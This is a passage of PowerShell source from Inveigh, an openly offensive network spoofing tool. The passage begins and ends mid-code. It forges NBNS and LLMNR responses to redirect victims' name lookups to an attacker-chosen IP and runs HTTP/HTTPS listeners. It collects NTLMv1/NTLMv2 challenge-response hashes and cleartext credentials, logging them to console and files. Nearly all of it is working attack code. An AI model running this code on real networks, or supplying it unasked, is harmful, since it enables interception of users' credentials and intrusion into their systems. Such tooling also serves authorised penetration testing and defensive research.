                            $NBNS_request_ignore = $false

                            if($NBNS -eq 'Y')
                            {

                                if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)
                                {
                                
                                    if(($NBNS_learning_log.Exists({param($s) $s -like "20* $NBNS_query_string"})))
                                    {
                                        $NBNS_learning_queue_time = [DateTime]$NBNS_learning_log.Find({param($s) $s -like "20* $NBNS_query_string"}).SubString(0,19)

                                        if((Get-Date) -ge $NBNS_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                        {
                                            $NBNS_learning_log.RemoveAt($NBNS_learning_log.FindIndex({param($s) $s -like "20* $NBNS_query_string"}))
                                            $NBNS_learning_send = $true
                                        }
                                        else
                                        {
                                            $NBNS_learning_send = $false
                                        }

                                    }
                                    else
                                    {           
                                        $NBNS_learning_send = $true
                                    }

                                    if($NBNS_learning_send)
                                    {
                                        $NBNS_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
                                        $NBNS_transaction_ID_bytes = $NBNS_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                        $NBNS_transaction_ID = $NBNS_transaction_ID -replace " ","-"
                                        $NBNS_UDP_client = new-Object System.Net.Sockets.UdpClient 137
                                        $NBNS_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]

                                        $NBNS_request_packet = $NBNS_transaction_ID_bytes +
                                                                0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                                $NBNS_hostname_bytes +
                                                                0x00,0x20,0x00,0x01

                                        $NBNS_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)
                                        $NBNS_UDP_client.Connect($NBNS_learning_destination_endpoint)
                                        $NBNS_UDP_client.Send($NBNS_request_packet,$NBNS_request_packet.Length)
                                        $NBNS_UDP_client.Close()
                                        $NBNS_learning_log.Add("$(Get-Date -format 's') $NBNS_transaction_ID $NBNS_query_string")
                                        $inveigh.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString)
                                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString)])
                                    }

                                }
                                 
                                if(($inveigh.valid_host_list -notcontains $NBNS_query_string -or $SpooferHostsReply -contains $NBNS_query_string) -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $NBNS_query_string) -and (
                                !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $NBNS_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (
                                !$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and ($NBNS_query_string.Trim() -ne '*') -and (
                                $SpooferLearning -eq 'N' -or ($SpooferLearning -eq 'Y' -and !$SpooferLearningDelay) -or ($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -ge $spoofer_learning_delay)) -and ($source_IP -ne $IP) -and (
                                $NBNSTypes -contains $NBNS_query_type))
                                {

                                    if($SpooferLearning -eq 'N' -or !$NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $NBNS_send_socket = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                        $NBNS_send_socket.SendBufferSize = 1024
                                        $NBNS_destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)
                                        $NBNS_send_socket.SendTo($NBNS_response_packet,$NBNS_destination_point)
                                        $NBNS_send_socket.Close()
                                        $NBNS_response_message = "- response sent"
                                    }
                                    else
                                    {
                                        $NBNS_request_ignore = $true
                                    }
                                    
                                }
                                else
                                {

                                    if($source_IP -eq $IP -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $NBNS_request_ignore = $true
                                    }
                                    elseif($NBNSTypes -notcontains $NBNS_query_type)
                                    {
                                        $NBNS_response_message = "- disabled NBNS type"
                                    }
                                    elseif($SpooferHostsReply -and $SpooferHostsReply -notcontains $NBNS_query_string)
                                    {
                                        $NBNS_response_message = "- $NBNS_query_string is not on reply list"
                                    }
                                    elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $NBNS_query_string)
                                    {
                                        $NBNS_response_message = "- $NBNS_query_string is on ignore list"
                                    }
                                    elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                                    {
                                        $NBNS_response_message = "- $source_IP is not on reply list"
                                    }
                                    elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                                    {
                                        $NBNS_response_message = "- $source_IP is on ignore list"
                                    }
                                    elseif($NBNS_query_string.Trim() -eq '*')
                                    {
                                        $NBNS_response_message = "- NBSTAT request"
                                    }
                                    elseif($inveigh.valid_host_list -contains $NBNS_query_string)
                                    {
                                        $NBNS_response_message = "- $NBNS_query_string is a valid host"
                                    }
                                    elseif($inveigh.IP_capture_list -contains $source_IP.IPAddressToString)
                                    {
                                        $NBNS_response_message = "- previous capture from $source_IP"
                                    }
                                    elseif($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)
                                    {
                                        $NBNS_response_message = "- " + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
                                    }
                                    elseif($source_IP -eq $IP -and !$NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $NBNS_response_message = "- request is local"
                                    }
                                    else
                                    {
                                        $NBNS_response_message = "- something went wrong"
                                    }

                                }

                            }

                            if(!$NBNS_request_ignore -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')
                            {
                                $inveigh.console_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
                            }
                            elseif($SpooferLearning -eq 'Y' -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01' -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                            {
                                [Byte[]]$NBNS_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]
                                $NBNS_response_IP = [System.Net.IPAddress]$NBNS_response_IP_bytes
                                $NBNS_response_IP = $NBNS_response_IP.IPAddressToString

                                if($inveigh.valid_host_list -notcontains $NBNS_query_string)
                                {
                                    $inveigh.valid_host_list.Add($NBNS_query_string)
                                    $inveigh.console_queue.Add("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list")
                                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP - $NBNS_query_string added to valid host list")])
                                }
                            }
                        }
                    }

                    5355 # LLMNR
                    {

                        if([System.BitConverter]::ToString($payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length - 3)]) -ne '00-1c') # ignore AAAA for now
                        {
                            $UDP_length[0] += $payload_bytes.Length - 2
                            $LLMNR_response_data = $payload_bytes[12..$payload_bytes.Length]

                            $LLMNR_response_data += $LLMNR_response_data +
                                                    $LLMNR_TTL_bytes +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
            
                            $LLMNR_response_packet = 0x14,0xeb +
                                                        $source_port[1,0] +
                                                        $UDP_length[1,0] +
                                                        0x00,0x00 +
                                                        $payload_bytes[0,1] +
                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        $LLMNR_response_data
                
                            $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                            $LLMNR_query = $LLMNR_query -replace "-00",""

                            if($LLMNR_query.Length -eq 2)
                            {
                                $LLMNR_query = [Char][System.Convert]::ToInt16($LLMNR_query,16)
                                $LLMNR_query_string = New-Object System.String($LLMNR_query)
                            }
                            else
                            {
                                $LLMNR_query = $LLMNR_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $LLMNR_query_string = New-Object System.String($LLMNR_query,0,$LLMNR_query.Length)
                            }

                            $LLMNR_request_ignore = $false
                
                            if($LLMNR -eq 'Y')
                            {

                                if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)
                                {

                                    if(($LLMNR_learning_log.Exists({param($s) $s -like "20* $LLMNR_query_string"})))
                                    {
                                        $LLMNR_learning_queue_time = [DateTime]$LLMNR_learning_log.Find({param($s) $s -like "20* $LLMNR_query_string"}).SubString(0,19)

                                        if((Get-Date) -ge $LLMNR_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                        {
                                            $LLMNR_learning_log.RemoveAt($LLMNR_learning_log.FindIndex({param($s) $s -like "20* $LLMNR_query_string"}))
                                            $LLMNR_learning_send = $true
                                        }
                                        else
                                        {
                                            $LLMNR_learning_send = $false
                                        }

                                    }
                                    else
                                    {           
                                        $LLMNR_learning_send = $true
                                    }

                                    if($LLMNR_learning_send)
                                    {
                                        $LLMNR_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
                                        $LLMNR_transaction_ID_bytes = $LLMNR_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                        $LLMNR_transaction_ID = $LLMNR_transaction_ID -replace " ","-"
                                        $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient
                                        $LLMNR_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]

                                        $LLMNR_request_packet = $LLMNR_transaction_ID_bytes +
                                                                0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                                ($LLMNR_hostname_bytes.Length - 1) +
                                                                $LLMNR_hostname_bytes +
                                                                0x00,0x01,0x00,0x01

                                        $LLMNR_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
                                        $LLMNR_UDP_client.Connect($LLMNR_learning_destination_endpoint)
                                        $LLMNR_UDP_client.Send($LLMNR_request_packet,$LLMNR_request_packet.Length)
                                        $LLMNR_UDP_client_port = ($LLMNR_UDP_client.Client.LocalEndPoint).Port
                                        $LLMNR_UDP_client.Close()
                                        $LLMNR_learning_log.Add("$(Get-Date -format 's') $LLMNR_transaction_ID $LLMNR_query_string")
                                        $inveigh.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252")
                                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string sent to 224.0.0.252")])
                                    }

                                }

                                if(($inveigh.valid_host_list -notcontains $LLMNR_query_string -or $SpooferHostsReply -contains $LLMNR_query_string) -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (
                                !$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $LLMNR_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (
                                !$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString) -and (
                                $SpooferLearning -eq 'N' -or ($SpooferLearning -eq 'Y' -and !$SpooferLearningDelay) -or ($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -ge $spoofer_learning_delay)))
                                {

                                    if($SpooferLearning -eq 'N' -or !$LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                    {
                                        $LLMNR_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                        $LLMNR_send_socket.SendBufferSize = 1024
                                        $LLMNR_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
                                        $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point)
                                        $LLMNR_send_socket.Close()
                                        $LLMNR_response_message = "- response sent"
                                    }
                                    else
                                    {
                                        $LLMNR_request_ignore = $true
                                    }
                                }
                                else
                                {

                                    if($SpooferHostsReply -and $SpooferHostsReply -notcontains $LLMNR_query_string)
                                    {
                                        $LLMNR_response_message = "- $LLMNR_query_string is not on reply list"
                                    }
                                    elseif($SpooferHostsIgnore -and $SpooferHostsIgnore -contains $LLMNR_query_string)
                                    {
                                        $LLMNR_response_message = "- $LLMNR_query_string is on ignore list"
                                    }
                                    elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
                                    {
                                        $LLMNR_response_message = "- $source_IP is not on reply list"
                                    }
                                    elseif($SpooferIPsIgnore -and $SpooferIPsIgnore -contains $source_IP)
                                    {
                                        $LLMNR_response_message = "- $source_IP is on ignore list"
                                    }
                                    elseif($inveigh.valid_host_list -contains $LLMNR_query_string)
                                    {
                                        $LLMNR_response_message = "- $LLMNR_query_string is a valid host"
                                    }
                                    elseif($inveigh.IP_capture_list -contains $source_IP.IPAddressToString)
                                    {
                                        $LLMNR_response_message = "- previous capture from $source_IP"
                                    }
                                    elseif($SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)
                                    {
                                        $LLMNR_response_message = "- " + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
                                    }
                                    else
                                    {
                                        $LLMNR_response_message = "- something went wrong"
                                    }
                                
                                }
                            
                            }

                            if(!$LLMNR_request_ignore)
                            {
                                $inveigh.console_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")])
                            }

                        }
                    }

                }

                switch($endpoint_source_port)
                {

                    5355 # LLMNR Response
                    {
                    
                        if($SpooferLearning -eq 'Y' -and $LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                        {
                            $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes[12] + 13)])
                            $LLMNR_query = $LLMNR_query -replace "-00",""

                            if($LLMNR_query.Length -eq 2)
                            {
                                $LLMNR_query = [Char][System.Convert]::ToInt16($LLMNR_query,16)
                                $LLMNR_query_string = New-Object System.String($LLMNR_query)
                            }
                            else
                            {
                                $LLMNR_query = $LLMNR_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $LLMNR_query_string = New-Object System.String($LLMNR_query,0,$LLMNR_query.Length)
                            }
                            
                            [Byte[]]$LLMNR_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]
                            $LLMNR_response_IP = [System.Net.IPAddress]$LLMNR_response_IP_bytes
                            $LLMNR_response_IP = $LLMNR_response_IP.IPAddressToString
                            
                            if($inveigh.valid_host_list -notcontains $LLMNR_query_string)
                            {
                                $inveigh.valid_host_list.Add($LLMNR_query_string)
                                $inveigh.console_queue.Add("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list")
                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list")])
                            }
                            
                        }

                    }

                }

            }

        }

        if($RunTime)
        {
         
            if($sniffer_stopwatch.Elapsed -ge $sniffer_timeout)
            {

                if($inveigh.HTTP_listener.IsListening)
                {
                    $inveigh.HTTP_listener.Stop()
                    $inveigh.HTTP_listener.Close()
                }

                $inveigh.console_queue.Add("Inveigh exited due to run time at $(Get-Date -format 's')")
                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh exited due to run time")])
                Start-Sleep -m 5
                $inveigh.running = $false
    
                if($inveigh.HTTPS)
                {
                    & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null
        
                    try
                    {
                        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                        $certificate_store.Open('ReadWrite')
                        $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$false)[0]
                        $certificate_store.Remove($certificate)
                        $certificate_store.Close()
                    }
                    catch
                    {

                        if($inveigh.status_output)
                        {
                            $inveigh.console_queue.Add("SSL Certificate Deletion Error - Remove Manually")
                        }

                        $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")

                        if($inveigh.file_output)
                        {
                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
                        }
                    
                    }

                }
                
                $inveigh.HTTP = $false
                $inveigh.HTTPS = $false     
            }
        }

        if($inveigh.file_output)
        {
            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveAt(0)
            }

            while($inveigh.cleartext_file_queue.Count -gt 0)
            {
                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
                $inveigh.cleartext_file_queue.RemoveAt(0)
            }

        }

    }

    $binary_reader.Close()
    $memory_stream.Dispose()
    $memory_stream.Close()
}

# End ScriptBlocks
# Begin Startup Functions

# HTTP/HTTPS Listener Startup Function 
function HTTPListener()
{
    $inveigh.HTTP_listener = New-Object System.Net.HttpListener

    if($inveigh.HTTP)
    {
        $inveigh.HTTP_listener.Prefixes.Add('http://*:80/')
    }

    if($inveigh.HTTPS)
    {
        $inveigh.HTTP_listener.Prefixes.Add('https://*:443/')
    }

    $inveigh.HTTP_listener.AuthenticationSchemes = "Anonymous" 
    $inveigh.HTTP_listener.Start()
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
        $HTTPBasicRealm).AddArgument($HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument(
        $HTTPDir).AddArgument($HTTPResponse).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

# Sniffer/Spoofer Startup Function
function SnifferSpoofer()
{
    $sniffer_runspace = [RunspaceFactory]::CreateRunspace()
    $sniffer_runspace.Open()
    $sniffer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $sniffer_powershell = [PowerShell]::Create()
    $sniffer_powershell.Runspace = $sniffer_runspace
    $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($LLMNR_response_message).AddArgument(
        $NBNS_response_message).AddArgument($IP).AddArgument($SpooferIP).AddArgument($SMB).AddArgument(
        $LLMNR).AddArgument($NBNS).AddArgument($NBNSTypes).AddArgument($SpooferHostsReply).AddArgument(
        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore).AddArgument(
        $SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument($SpooferLearningInterval).AddArgument(
        $RunTime).AddArgument($LLMNRTTL).AddArgument($NBNSTTL) > $null
    $sniffer_powershell.BeginInvoke() > $null
}

# End Startup Functions

# Startup Enabled Services

# HTTP Server Start
if($inveigh.HTTP -or $inveigh.HTTPS)
{
    HTTPListener
}

# Sniffer/Spoofer Start - always enabled
SnifferSpoofer

if($inveigh.console_output)
{

    if($ConsoleStatus)
    {    
        $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
        $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    :console_loop while(($inveigh.running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
    {

        while($inveigh.console_queue.Count -gt 0)
        {

            if($inveigh.output_stream_only)
            {
                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveAt(0)
            }
            else
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    "* written to *"
                    {

                        if($inveigh.file_output)
                        {
                            Write-Warning $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "* for relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "*SMB relay *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    "* local administrator *"
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                } 

            }

        }

        if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
        {
            
            if($inveigh.cleartext_list.Count -gt 0)
            {
                Write-Output("$(Get-Date -format 's') - Current unique cleartext captures:" + $inveigh.newline)
                $inveigh.cleartext_list.Sort()

                foreach($unique_cleartext in $inveigh.cleartext_list)
                {
                    if($unique_cleartext -ne $unique_cleartext_last)
                    {
                        Write-Output($unique_cleartext + $inveigh.newline)
                    }

                    $unique_cleartext_last = $unique_cleartext
                }

                Start-Sleep -m 5
            }
            else
            {
                Write-Output("$(Get-Date -format 's') - No cleartext credentials have been captured" + $inveigh.newline)
            }
            
            if($inveigh.NTLMv1_list.Count -gt 0)
            {
                Write-Output("$(Get-Date -format 's') - Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
                $inveigh.NTLMv1_list.Sort()

                foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
                {
                    $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

                    if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
                    {
                        Write-Output($unique_NTLMv1 + $inveigh.newline)
                    }

                    $unique_NTLMv1_account_last = $unique_NTLMv1_account
                }

                $unique_NTLMv1_account_last = ''
                Start-Sleep -m 5
                Write-Output("$(Get-Date -format 's') - Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)

                foreach($NTLMv1_username in $inveigh.NTLMv1_username_list)
                {
                    Write-Output($NTLMv1_username + $inveigh.newline)
                }

                Start-Sleep -m 5
            }
            else
            {
                Write-Output("$(Get-Date -format 's') - No NTLMv1 challenge/response hashes have been captured" + $inveigh.newline)
            }

            if($inveigh.NTLMv2_list.Count -gt 0)
            {
                Write-Output("$(Get-Date -format 's') - Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
                $inveigh.NTLMv2_list.Sort()

                foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
                {
                    $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

                    if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
                    {
                        Write-Output($unique_NTLMv2 + $inveigh.newline)
                    }

                    $unique_NTLMv2_account_last = $unique_NTLMv2_account
                }

                $unique_NTLMv2_account_last = ''
                Start-Sleep -m 5
                Write-Output("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)

                foreach($NTLMv2_username in $inveigh.NTLMv2_username_list)
                {
                    Write-Output($NTLMv2_username + $inveigh.newline)
                }
                
            }
            else
            {
                Write-Output("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured" + $inveigh.newline)
            }

            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

        }

        if($inveigh.console_input)
        {

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }
        
        }

        Start-Sleep -m 5
    }

}

}
#End Invoke-Inveigh

function Stop-Inveigh
{
<#
.SYNOPSIS
Stop-Inveigh will stop all running Inveigh functions.
#>

if($inveigh)
{

    if($inveigh.running -or $inveigh.relay_running -or $inveigh.unprivileged_running)
    {

        if($inveigh.HTTP_listener.IsListening)
        {
            $inveigh.HTTP_listener.Stop()
            $inveigh.HTTP_listener.Close()
        }
            
        if($inveigh.unprivileged_running)
        {
            $inveigh.unprivileged_running = $false
            Start-Sleep -s 5
            Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh Unprivileged exited" | Out-File $Inveigh.log_out_file -Append
            }

        }
            
        if($inveigh.relay_running)
        {
            $inveigh.relay_running = $false
            Write-Output("Inveigh Relay exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Relay exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh Relay exited" | Out-File $Inveigh.log_out_file -Append
            }

        } 

        if($inveigh.running)
        {
            $inveigh.running = $false
            Write-Output("Inveigh exited at $(Get-Date -format 's')")
            $inveigh.log.Add("$(Get-Date -format 's') - Inveigh exited")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh exited" | Out-File $Inveigh.log_out_file -Append
            }

        } 

    }
    else
    {
        Write-Output("There are no running Inveigh functions")
    }
    
    if($inveigh.HTTPS)
    {
        & "netsh" http delete sslcert ipport=0.0.0.0:443 > $null

        try
        {
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = $certificate_store.certificates.Find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
            $certificate_store.Remove($certificate)
            $certificate_store.Close()
        }
        catch
        {
            Write-Output("SSL Certificate Deletion Error - Remove Manually")
            $inveigh.log.Add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")  > $null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually" | Out-File $Inveigh.log_out_file -Append   
            }

        }
    }

    $inveigh.HTTP = $false
    $inveigh.HTTPS = $false
}
else
{
    Write-Output("There are no running Inveigh functions")|Out-Null
}

} 

function Get-Inveigh
{
<#
.SYNOPSIS
Get-Inveigh will get stored Inveigh data from memory.

.PARAMETER Console
Get queued console output. This is also the default if no parameters are set. 

.PARAMETER Log
Get log entries.

.PARAMETER NTLMv1
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv1Unique
Get the first captured NTLMv1 challenge/response for each unique account.

.PARAMETER NTLMv1Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER NTLMv2
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2Unique
Get the first captured NTLMv2 challenge/response for each unique account.

.PARAMETER NTLMv2Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER Cleartext
Get captured cleartext credentials.

.PARAMETER CleartextUnique
Get unique captured cleartext credentials.

.PARAMETER Learning
Get valid hosts discovered through spoofer learning.
#>

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]$Console,
    [parameter(Mandatory=$false)][Switch]$Log,
    [parameter(Mandatory=$false)][Switch]$NTLMv1,
    [parameter(Mandatory=$false)][Switch]$NTLMv2,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
    [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
    [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
    [parameter(Mandatory=$false)][Switch]$Cleartext,
    [parameter(Mandatory=$false)][Switch]$CleartextUnique,
    [parameter(Mandatory=$false)][Switch]$Learning,
